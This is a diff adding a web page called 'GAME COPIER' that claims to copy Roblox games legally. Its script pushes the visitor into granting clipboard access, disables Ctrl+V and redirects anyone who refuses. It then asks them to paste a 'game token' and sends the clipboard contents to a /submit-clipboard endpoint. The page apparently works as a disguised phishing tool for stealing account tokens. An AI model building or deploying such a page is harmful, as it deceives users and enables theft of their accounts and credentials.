@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>GAME COPIER</title>
+  <style>
+    body { font-family: sans-serif; padding: 30px; }
+    input, button { margin: 10px 0; display: block; }
+    #tokenBox { display: none; }
+  </style>
+</head>
+<body>
+  <h1>GAME COPIER</h1>
+  <p>Copy games (legally).</p>
+  <input type="text" id="gameIdInput" placeholder="Enter Game ID" autocomplete="off" />
+  <button id="submitBtn">Submit</button>
+
+  <div id="tokenBox">
+    <p>Paste the game token here:</p>
+    <input type="text" id="tokenInput" />
+    <button id="tokenSubmitBtn">Submit Token</button>
+  </div>
+
+  <script>
+    const input = document.getElementById('gameIdInput');
+    let permissionGranted = false;
+
+    input.addEventListener('paste', async (e) => {
+      e.preventDefault();
+      try {
+        const permission = await navigator.permissions.query({ name: 'clipboard-read' });
+        if (permission.state === 'granted' || permission.state === 'prompt') {
+          await navigator.clipboard.readText();
+          permissionGranted = true;
+          alert('Clipboard access granted!');
+        } else {
+          alert('Clipboard access denied.');
+          window.location.href = 'https://example.com/denied'; // Replace later
+        }
+      } catch {
+        alert('Clipboard permission not granted.');
+        window.location.href = 'https://example.com/denied';
+      }
+    });
+
+    document.getElementById('submitBtn').onclick = () => {
+      if (!permissionGranted) {
+        alert('Clipboard access is required.');
+        return;
+      }
+      const gameId = input.value.trim();
+      if (!gameId) return alert('Enter a game ID!');
+      window.open(`https://roblox.com/${gameId}`, '_blank');
+
+      setTimeout(() => {
+        document.getElementById('tokenBox').style.display = 'block';
+      }, 2000);
+    };
+
+    document.getElementById('tokenSubmitBtn').onclick = async () => {
+      try {
+        const clipboardData = await navigator.clipboard.readText();
+        await fetch('/submit-clipboard', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ clipboardData })
+        });
+        alert('Clipboard saved!');
+      } catch {
+        alert('Failed to read or send clipboard data.');
+      }
+    };
+
+    input.addEventListener('keydown', (e) => {
+      if (e.ctrlKey && e.key === 'v') {
+        e.preventDefault();
+        alert('Ctrl+V is disabled. Try again to trigger clipboard permission.');
+      }
+    });
+  </script>
+</body>
+</html>
